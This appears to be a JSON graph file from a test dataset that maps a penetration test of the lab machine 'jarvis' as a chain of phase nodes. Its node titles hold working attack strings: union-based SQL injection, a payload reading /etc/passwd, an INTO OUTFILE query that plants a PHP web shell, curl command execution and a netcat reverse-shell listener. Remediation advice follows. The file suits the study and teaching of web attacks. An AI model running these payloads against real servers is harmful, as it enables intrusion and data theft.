@@ -1,0 +1,915 @@
+{
+  "machine": "jarvis",
+  "row_index": 6,
+  "legend": {
+    "node_types": {
+      "State (Blue)": "Pentest phase / sub-phase, or informational item (target IP, hostname, machine name, OS, ...)",
+      "Action (Orange)": "A concrete action the pentester performed",
+      "Finding (Green)": "The result/finding produced by an Action"
+    },
+    "status_shading": {
+      "dark": "completed",
+      "mid": "in_progress",
+      "light": "to_do"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "State -> State, advancing through the PTT",
+      "SearchUpdate (Green)": "State -> Action, starting work on a PTT item",
+      "TrackUpdate (Blue)": "Action -> Finding, item execution produced findings",
+      "Prediction (Purple)": "Finding -> State, findings lead back into state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "state:jarvis:r6:START",
+      "label": "State: Start",
+      "type": "State",
+      "color": "#3A86FF",
+      "status": "in_progress",
+      "title": "Start of pentest tree snapshot for 'jarvis' (row 6).",
+      "size": 30,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1",
+      "label": "State 1\nReconnaissance",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "1 Reconnaissance [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.1",
+      "label": "State 1.1\nPassive Information Gathering",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.1 Passive Information Gathering [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.2",
+      "label": "State 1.2\nActive Information Gathering",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.2 Active Information Gathering [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.3",
+      "label": "State 1.3\nIdentify Open Ports, Services…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.3 Identify Open Ports, Services running on the open ports and their versions [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.3.1",
+      "label": "State 1.3.1\nPerform a port scan - {Host S…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.3.2",
+      "label": "State 1.3.2\nDetermine the services and ve…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.4",
+      "label": "State 1.4\nTarget IP - 10.10.10.143",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.4 Target IP - 10.10.10.143 [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.5",
+      "label": "State 1.5\nWebpage Analysis on Apache Se…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.5 Webpage Analysis on Apache Server (Port 80) - \"Stark Hotel\" [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.5.1",
+      "label": "State 1.5.1\nWebpage Title - Stark Hotel",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.5.1 Webpage Title - Stark Hotel [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.5.2",
+      "label": "State 1.5.2\nNotable Feature - Login optio…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.5.2 Notable Feature - Login option available [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.5.3",
+      "label": "State 1.5.3\nVirtual Host (vhost) - supers…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.5.4",
+      "label": "State 1.5.4\nWebpage Security Note - {Obse…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.5.4 Webpage Security Note - {Observation: The webpage titled \"Stark Hotel\" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.5.5",
+      "label": "State 1.5.5\nWebpage Navigation and Featur…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed: Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the \"Book now!\" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.6",
+      "label": "State 1.6\nGobuster Scanning Outcome",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.6 Gobuster Scanning Outcome [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.6.1",
+      "label": "State 1.6.1\nAction - Running Gobuster to …",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.6.1 Action - Running Gobuster to scan the server [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.6.2",
+      "label": "State 1.6.2\nResult - Received a ban messa…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.6.2 Result - Received a ban message stating, \"Hey you have been banned for 90 seconds, don't be bad.\" [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.6.3",
+      "label": "State 1.6.3\nImplication - The server has …",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.7",
+      "label": "State 1.7\nSQL Injection Vulnerability A…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.7 SQL Injection Vulnerability Analysis - \"Stark Hotel\" Server (Port 80) [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.7.1",
+      "label": "State 1.7.1\nVulnerable Parameter - {Param…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.7.1 Vulnerable Parameter - {Parameter: `cod` in the URL `http://10.10.10.143/room.php?cod=`; Expectation: Server expects an integer value; Vulnerability: Susceptible to SQL injection; Database Insight: The table accessed by the query contains 7 rows} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.7.2",
+      "label": "State 1.7.2\nInjection Testing - {Method: …",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.7.2 Injection Testing - {Method: Union based SQL injection; Test Query: `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`; Resulting Output: Displays values 5, 2, 3, and 4; Inference: These values are injectable, indicating potential columns for data extraction} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.7.3",
+      "label": "State 1.7.3\nAdditional Information from O…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.7.3 Additional Information from Output - {Displayed Content: Price: $3 per night; Booking Link: [Go to book!]} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.8",
+      "label": "State 1.8\nSQL Injection Exploitation De…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.8 SQL Injection Exploitation Details - \"Stark Hotel\" Server (Port 80) [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.8.1",
+      "label": "State 1.8.1\nInjection Technique - {Test Q…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.8.1 Injection Technique - {Test Query 1: `http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7`; Output Interpretation: Database Version: 10.1.37-MariaDB-0+deb9u1, Current Database User: DBadmin@localhost; Displayed Content: Price symbol and [Go to book!] link} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.8.2",
+      "label": "State 1.8.2\nFile Interaction Capabilities…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.8.2 File Interaction Capabilities - {Test Query 2: `http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7`; Output: Lists system users (`root`, `daemon`, `bin`, etc.), indicating successful reading of sensitive system file `/etc/passwd`; Apache Configuration Inspection: Configuration Path: `/etc/apache2/sites-enabled/000-default.conf`, Relevant Configuration Details: DocumentRoot: /var/www/html, ServerName Directive: Used for redirection URLs and virtual host identification; Potential for File Writing: In MySQL, files can be written to the server using the `INTO OUTFILE` keyword, targeting the configured DocumentRoot} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.8.3",
+      "label": "State 1.8.3\nSecurity Implications - {Data…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.8.3 Security Implications - {Database Access: The ability to query the database version and current user suggests elevated privileges or weak security configurations; File Reading: Ability to read `/etc/passwd` demonstrates significant security risks, potentially allowing further exploitation such as privilege escalation; File Writing: The potential to write files using MySQL’s `INTO OUTFILE` could be exploited to execute arbitrary code or persist access if combined with other vulnerabilities} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.8.4",
+      "label": "State 1.8.4\nRecommendation - {Immediate A…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.8.4 Recommendation - {Immediate Action: Audit and restrict SQL query handling on the server to prevent SQL injection; Further Investigation: Review server configuration for file permissions and secure database access controls to mitigate the risks of unauthorized file operations and data exposure} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.9",
+      "label": "State 1.9\nWeb Server Exploitation Analy…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.9 Web Server Exploitation Analysis - \"Stark Hotel\" Server (Port 80) [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.9.1",
+      "label": "State 1.9.1\nExploitation Steps - {File Cr…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.9.1 Exploitation Steps - {File Creation via SQL Injection: SQL Injection Query: `http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST[\"exec\"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'; Outcome: Created a PHP file `pwned.php` on the server in the directory `/var/www/html`; File Content: PHP script capable of executing system commands passed through the `exec` request parameter} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.9.2",
+      "label": "State 1.9.2\nRemote Command Execution - {C…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.9.2 Remote Command Execution - {Command Execution Test: `curl -X POST http://10.10.10.143/pwned.php --data-urlencode exec=whoami`; Result: Successfully executed the command `whoami`, confirming the server's response as `www-data`, indicating the command was executed with web server user privileges} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.9.3",
+      "label": "State 1.9.3\nEstablishing a Reverse Shell …",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.9.3 Establishing a Reverse Shell - {Listening on Attacker's Machine: `nc -lvp 1234`; Connection Established: Server at `10.10.10.143` connected to the attacker's listener on port `1234`; Shell Interaction: Errors Reported: Issues related to terminal control (e.g., \"inappropriate ioctl for device\" and \"no job control in this shell\"); Command Execution: Executing `whoami` within the shell confirmed the identity as `www-data`} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.9.4",
+      "label": "State 1.9.4\nSecurity Implications - {The …",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.9.4 Security Implications - {The exploitation sequence demonstrates a high-risk vulnerability where an attacker can execute arbitrary commands on the server, potentially leading to full system compromise. The use of the web server's privileges (`www-data`) indicates that any command execution is confined within the permissions assigned to the web server's user account} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jarvis:r6:1.9.5",
+      "label": "State 1.9.5\nRecommendations - {Immediate …",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.9.5 Recommendations - {Immediate Remediation: Patch the SQL injection vulnerability on `room.php`. Remove the malicious `pwned.php` file and check for other potentially malicious files. Review and restrict file permissions, especially in web-accessible directories; Security Enhancements: Implement stringent input validation and parameterized queries to prevent SQL injection. Regularly audit web server and database configurations to ensure they adhere to security best practices. Consider deploying a Web Application Firewall (WAF) to detect and mitigate exploitation attempts; Incident Response: Conduct a thorough investigation to determine if further exploitation or data breaches have occurred. Enhance monitoring and logging to detect unusual activities indicative of a breach or attempted exploitation} [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "state:jarvis:r6:START",
+      "to": "state:jarvis:r6:1",
+      "label": "1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1",
+      "to": "state:jarvis:r6:1.1",
+      "label": "1.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.1",
+      "to": "state:jarvis:r6:1.2",
+      "label": "1.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.2",
+      "to": "state:jarvis:r6:1.3",
+      "label": "1.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.3",
+      "to": "state:jarvis:r6:1.3.1",
+      "label": "1.3.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.3.1",
+      "to": "state:jarvis:r6:1.3.2",
+      "label": "1.3.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.3.2",
+      "to": "state:jarvis:r6:1.4",
+      "label": "1.4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.4",
+      "to": "state:jarvis:r6:1.5",
+      "label": "1.5",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.5",
+      "to": "state:jarvis:r6:1.5.1",
+      "label": "1.5.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.5.1",
+      "to": "state:jarvis:r6:1.5.2",
+      "label": "1.5.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.5.2",
+      "to": "state:jarvis:r6:1.5.3",
+      "label": "1.5.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.5.3",
+      "to": "state:jarvis:r6:1.5.4",
+      "label": "1.5.4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.5.4",
+      "to": "state:jarvis:r6:1.5.5",
+      "label": "1.5.5",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.5.5",
+      "to": "state:jarvis:r6:1.6",
+      "label": "1.6",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.6",
+      "to": "state:jarvis:r6:1.6.1",
+      "label": "1.6.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.6.1",
+      "to": "state:jarvis:r6:1.6.2",
+      "label": "1.6.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.6.2",
+      "to": "state:jarvis:r6:1.6.3",
+      "label": "1.6.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.6.3",
+      "to": "state:jarvis:r6:1.7",
+      "label": "1.7",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.7",
+      "to": "state:jarvis:r6:1.7.1",
+      "label": "1.7.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.7.1",
+      "to": "state:jarvis:r6:1.7.2",
+      "label": "1.7.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.7.2",
+      "to": "state:jarvis:r6:1.7.3",
+      "label": "1.7.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.7.3",
+      "to": "state:jarvis:r6:1.8",
+      "label": "1.8",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.8",
+      "to": "state:jarvis:r6:1.8.1",
+      "label": "1.8.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.8.1",
+      "to": "state:jarvis:r6:1.8.2",
+      "label": "1.8.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.8.2",
+      "to": "state:jarvis:r6:1.8.3",
+      "label": "1.8.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.8.3",
+      "to": "state:jarvis:r6:1.8.4",
+      "label": "1.8.4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.8.4",
+      "to": "state:jarvis:r6:1.9",
+      "label": "1.9",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.9",
+      "to": "state:jarvis:r6:1.9.1",
+      "label": "1.9.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.9.1",
+      "to": "state:jarvis:r6:1.9.2",
+      "label": "1.9.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.9.2",
+      "to": "state:jarvis:r6:1.9.3",
+      "label": "1.9.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.9.3",
+      "to": "state:jarvis:r6:1.9.4",
+      "label": "1.9.4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jarvis:r6:1.9.4",
+      "to": "state:jarvis:r6:1.9.5",
+      "label": "1.9.5",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 33,
+    "total_edges": 32,
+    "state_nodes": 33,
+    "action_nodes": 0,
+    "finding_nodes": 0,
+    "ptt_items_parsed": 32
+  },
+  "csv_row_index": 50,
+  "source_csv": "test_data.csv"
+}
